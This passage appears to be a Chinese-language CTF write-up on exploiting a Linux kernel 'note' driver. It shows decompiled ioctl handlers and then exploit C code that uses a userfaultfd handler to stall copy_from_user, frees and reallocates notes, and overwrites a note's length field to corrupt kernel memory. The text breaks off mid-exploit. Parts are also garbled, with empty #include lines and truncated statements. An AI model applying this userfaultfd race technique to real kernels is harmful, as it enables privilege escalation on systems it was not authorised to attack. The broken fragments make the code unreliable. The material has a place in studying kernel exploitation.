    do                  
    {
      *ptr = 0LL;
      ++ptr;
    }
    while (ptr length;
        userptr = req.userptr;
        contentPtr = (note->contentPtr + page_offset_base);
        _check_object_size(encBuffer, length, 0LL);
        copy_from_user(encBuffer, userptr, length);
        if ( length )
            {
                i = 0;
                do
                {
                  encBuffer[i/8] ^= note->key;
                  i += 8LL;
                }
                while (length > i);                    
                memcpy(contentPtr, encBuffer, length)
            }
        return 0LL;
        }
    }
    // (4) show功能。将content用XOR解密后用copy_to_user打印出来。
    if ( (_DWORD)operation == -254 )
    {
      tmp_note2 = (note *)global_notes[note_idx2];
        result = 0LL;
        if ( tmp_note2 )
        {
          len = LOBYTE(tmp_note2->length);          
          contentPtr2 = (_DWORD *)(tmp_note2->contentPtr + page_offset_base);
          memcpy(encBuffer, contentPtr, len)
        }
      if ( len )
      {
         ji_2 = 0LL;
         do
         {
           encBuffer[ji_2 / 8] ^= tmp_note2->key;
           ji_2 += 8LL;
         }
         while ( ji_2 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct _noteRequest
    {
        size_t idx;
        size_t length;
        char* userptr;
    }noteRequest;
    int fd;
    void init()
    {
        fd = open("/dev/note", 0);
        if (fd<0)
            exit(-1);
        puts("[+] init done!");
    }
    void errExit(char* msg)
    {
        puts(msg);
        exit(-1);
    }
    void create(char* buf, uint8_t length)
    {
        noteRequest req;
        req.length  = length;
        req.userptr = buf;
        if (ioctl(fd, -256, &req) < 0)
            errExit("[-] Failed to create!");
    }
    void edit(uint8_t idx, char* buf, uint8_t length)
    {
        noteRequest req;
        req.length  = length;
        req.userptr = buf;
        req.idx     = idx;
        if (ioctl(fd, -255, &req) < 0)
            errExit("[-] Failed to edit!");
    }
    void show(uint8_t idx, char* buf)
    {
        noteRequest req;
        req.userptr = buf;
        req.idx     = idx;
        if (ioctl(fd, -254, &req) < 0)
            errExit("[-] Failed to show!");
    }
    void delete()
    {
        noteRequest req;
        if (ioctl(fd, -253, &req) < 0)
            errExit("[-] Failed to delete!");
    }
    char buffer[0x1000];
    #define FAULT_PAGE ((void*)(0x1337000))
    void* handler(void *arg)
    {
        struct uffd_msg msg;
        unsigned long uffd = (unsigned long)arg;
        puts("[+] Handler created");
        struct pollfd pollfd;
        int nready;
        pollfd.fd     = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready != 1)  // 这会一直等待，直到copy_from_user访问FAULT_PAGE
            errExit("[-] Wrong pool return value");
        printf("[+] Trigger! I'm going to hang\n");
        //现在主线程停在copy_from_user函数了，可以进行利用了
        delete();
        create(buffer, 0);
        create(buffer, 0);
        // 原始内存：note0 struct + 0x10 buffer
        // 当前内存：note0 struct + note1 struct
        // 当主线程继续拷贝时，就会破坏note1区域
        if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) // 偶从uffd读取msg结构，虽然没用
            errExit("[-] Error in reading uffd_msg");
        struct uffdio_copy uc;
        memset(buffer, 0, sizeof(buffer));
        buffer[8] = 0xf0; //把note1 的length改成0xf0
        uc.src = (unsigned long)buffer;
        uc.dst = (unsigned long)FAULT_PAGE;
        uc.len = 0x1000;
        uc.mode = 0;
        ioctl(uffd, UFFDIO_COPY, &uc);  // 恢复执行copy_from_user
        puts("[+] done 1");